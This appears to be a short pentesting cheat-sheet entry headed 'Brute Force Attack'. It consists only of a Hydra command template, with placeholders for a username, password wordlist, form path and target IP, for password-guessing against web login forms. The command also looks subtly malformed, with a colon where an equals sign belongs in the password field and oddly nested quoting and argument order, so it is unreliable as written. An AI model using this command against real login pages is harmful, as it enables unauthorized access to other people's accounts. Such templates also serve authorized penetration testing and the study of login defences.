# Brute Force Attack

```
hydra -l <user> -P <wordlist> http-post-form "/<path>:param1=^USER^&param2:^PASS^:F="<incorrect>" <ip> -t 4 <proto>
```
